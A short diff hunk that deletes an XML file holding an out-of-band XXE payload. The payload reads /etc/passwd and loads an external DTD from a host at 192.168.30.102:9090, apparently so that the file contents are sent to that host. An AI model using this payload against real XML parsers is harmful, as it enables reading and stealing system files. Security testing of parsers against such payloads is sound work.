@@ -1,7 +1,0 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE data [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % dtd SYSTEM "http://192.168.30.102:9090/xxe.dtd">
-  %dtd;
-]>
-<data>&send;</data>
